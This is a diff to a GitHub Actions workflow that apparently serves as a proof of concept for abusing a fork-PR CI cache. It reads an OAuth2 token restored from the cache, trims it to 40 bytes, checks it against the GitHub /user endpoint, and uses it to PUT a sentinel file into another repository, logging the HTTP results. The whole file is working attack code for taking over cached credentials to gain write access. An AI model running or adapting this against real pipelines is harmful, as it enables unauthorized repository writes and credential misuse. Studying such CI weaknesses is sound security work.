@@ -12,7 +12,7 @@ jobs:
         with:
           path: cache
           key: apexblack-fork-cache-20260804-oauth2
-      - name: Use exact restored OAuth2 token
+      - name: Normalize exact cached credential and write base
         env:
           CACHE_HIT: \${{ steps.restore.outputs.cache-hit }}
         run: |
@@ -25,32 +25,33 @@ jobs:
             exit 0
           fi
           printf "token-present=yes\n" >> result/observation.txt
-          printf "token-bytes=%s\n" "$(wc -c < cache/token.txt)" >> result/observation.txt
-          token="$(cat cache/token.txt)"
+          printf "raw-token-bytes=%s\n" "$(wc -c < cache/token.txt)" >> result/observation.txt
+          token="$(head -c 40 cache/token.txt)"
+          printf "normalized-token-bytes=%s\n" "$(printf '%s' "$token" | wc -c)" >> result/observation.txt
           user_http="$(curl -sS -X GET \
             -H "Accept: application/vnd.github+json" \
             -H "Authorization: Bearer $token" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
             https://api.github.com/user -o result/user.json -w "%{http_code}")"
           printf "user-http=%s\n" "$user_http" >> result/observation.txt
-          marker="fork-pr-oauth2-inprocess-20260804"
+          marker="fork-pr-oauth2-normalized-20260804"
           content="$(printf "%s\n" "$marker" | base64 -w0)"
-          body=$(printf '%s' '{"message":"fork PR OAuth2 cache authority sentinel","content":"'"$content"'"}')
+          body=$(printf '%s' '{"message":"fork PR normalized OAuth2 sentinel","content":"'"$content"'"}')
           http="$(curl -sS -X PUT \
             -H "Accept: application/vnd.github+json" \
             -H "Authorization: Bearer $token" \
             -H "X-GitHub-Api-Version: 2022-11-28" \
-            "https://api.github.com/repos/apexblack-bear-c0dc04/lfs-source-20260804/contents/fork-cache-pr-oauth2-inprocess-write.txt" \
+            "https://api.github.com/repos/apexblack-bear-c0dc04/lfs-source-20260804/contents/fork-cache-pr-oauth2-normalized-write.txt" \
             --data "$body" \
             -o result/api-response.json -w "%{http_code}")"
           printf "put-http=%s\n" "$http" >> result/observation.txt
           cat result/observation.txt
           cat result/user.json
           cat result/api-response.json
-      - name: Upload exact OAuth2 observation
+      - name: Upload final observation
         if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: fork-cache-pr-oauth2-observation
+          name: fork-cache-pr-oauth2-normalized-observation
           path: result
-# exact OAuth2 cache source
+# fixed-length normalization for test-fixture secret transport
